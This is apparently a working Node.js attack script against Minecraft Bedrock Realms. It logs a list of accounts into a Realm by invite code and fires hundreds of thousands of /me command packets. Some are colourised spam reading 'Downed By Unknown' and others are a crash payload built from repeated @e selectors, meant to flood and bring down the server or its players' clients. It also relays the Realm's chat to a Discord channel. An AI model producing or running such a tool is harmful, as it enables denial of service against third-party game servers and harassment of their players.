const bedrock = require('bedrock-protocol');
const realmCode = 'kRDM5UDU2io';
const fs = require('fs')
const crashtype = 2  // 0 is spam 1 is crash 2 is both
const { Client, Events, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const { token } = require('./config.json');

const accdir = 'accounts.txt';
const accContent = fs.readFileSync(accdir, 'utf-8');
const accArray = accContent.split('\n');
const accountnames = accArray; 



const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once(Events.ClientReady, c => {
	console.log(`Discord bot started successfully! : ${c.user.tag}`);

});

function randomcode() {
    const optionsString = "§c,§b,§e,§a,§9,§8,§7";
    const optionsArray = optionsString.split(',');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    const randomOption = optionsArray[randomIndex];
    return randomOption;
}
function colorizeText(text) {
    const words = text.split(' '); 
    const coloredWords = words.map(word => {
        const colorCode = randomcode();
        return `${colorCode}${word}`;
    });

    return coloredWords.join(' '); 
}


for (let i = 0; i < accountnames.length; i++) {
    const accountname = accountnames[i];
    const bedrockClient = bedrock.createClient({
        username: accountname,
        profilesFolder: './profiles',
        skinData: {
            CurrentInputMode: 3,
            DefaultInputMode: 3,
            DeviceModel: 'Xbox Series X',
            DeviceOS: 11,
        },
        skipPing: true,
        realms: {
            realmInvite: realmCode,
        }
    });
    bedrockClient.on('join', () => {
        console.log(`Connectig To Realm ${realmCode} as ${accountname}`);
        })
    bedrockClient.on('spawn', () => {
        console.log(`Joined Realm ${realmCode} as ${accountname}`);
        function spam() {
                  const inputText = "| Downed By Unknown |\n";
                  const coloredText = colorizeText(inputText);
                  bedrockClient.write('command_request', {
                    command: `me ${coloredText}`,
                    origin: {
                        type: 5,
                        uuid: '',
                        request_id: '',
                    },
                    internal: false,
                    version: 66,
                });
            }
        function crash() {
                  bedrockClient.write('command_request', {
                    command: `me §l§c§k@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e`,
                    origin: {
                        type: 5,
                        uuid: '',
                        request_id: '',
                    },
                    internal: false,
                    version: 66,
                });
            }
        for (let j = 0; j < 500000; j++) {
          if (crashtype === 0) {

            spam()
            spam()
            spam()
            spam()
            spam()
            spam()
            spam()
            spam()
            spam()
            spam()
          } else if (crashtype === 1) {
                crash()
                crash()
                crash()
                crash()
                crash()
                crash()
                crash()
                crash()
                crash()
                crash()
                crash()
          } else if (crashtype === 2) {
              spam()
                spam()
                spam()
                spam()
                spam()
                spam()
                spam()
                spam()
                spam()
                spam()
                spam()
                spam()
                crash()
                crash()
          }
        }
               
    });
    bedrockClient.on('disconnect', (packet) => {
        console.log(`Disconnected From ${realmCode} as ${accountname} - ${packet.message}`);
    });

    
    bedrockClient.on('text', (packet) => { 
        if (packet.source_name != bedrockClient.username) {
           if (packet.source_name !== accountname) { //not sure if this works, cuz i cant test it, but it should.
            const channel = client.channels.cache.get("1153364285410512916"); //relay channel name
            const chatrelay = new EmbedBuilder()
            .setColor(0x0099FF)
            .setTitle('New Message Recieved!')
            .setDescription(`${packet.source_name} >> ${packet.message} || Date and Time > ${new Date().toLocaleString()}`)
            channel.send({ embeds: [chatrelay] });
        }  }
      })
}

client.login(token);